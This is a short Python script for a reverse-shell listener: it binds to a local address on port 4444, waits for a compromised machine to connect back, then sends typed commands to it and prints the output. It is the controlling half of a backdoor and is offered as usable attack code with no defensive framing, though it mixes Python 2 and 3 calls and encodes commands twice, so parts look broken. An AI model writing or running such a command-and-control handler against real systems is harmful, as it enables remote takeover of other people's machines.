import json
import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from" + str(address))

    def execute_remotely(self, command):
        self.connection.send(command.encode('utf-8'))
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = raw_input(">> ".encode('utf-8'))
            result = self.execute_remotely(command.encode('utf-8'))
            print(result)


my_listener = Listener("192.168.3.5", 4444)
my_listener.run()
